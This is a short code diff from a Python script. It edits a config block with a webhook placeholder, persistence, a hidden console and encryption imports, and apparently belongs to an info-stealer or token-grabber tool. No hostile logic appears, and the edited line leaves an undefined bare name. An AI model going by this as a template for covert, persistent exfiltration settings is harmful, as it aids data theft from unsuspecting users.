@@ -11,7 +11,7 @@ from Crypto.Cipher import AES
 from cryptography.fernet import Fernet
 
 config = {
-    'webhook': 'webhookhere',
+    'webhook': webhookhere,
     'persist': True,
     'keep-alive': False,  
     'hideconsole': True, 
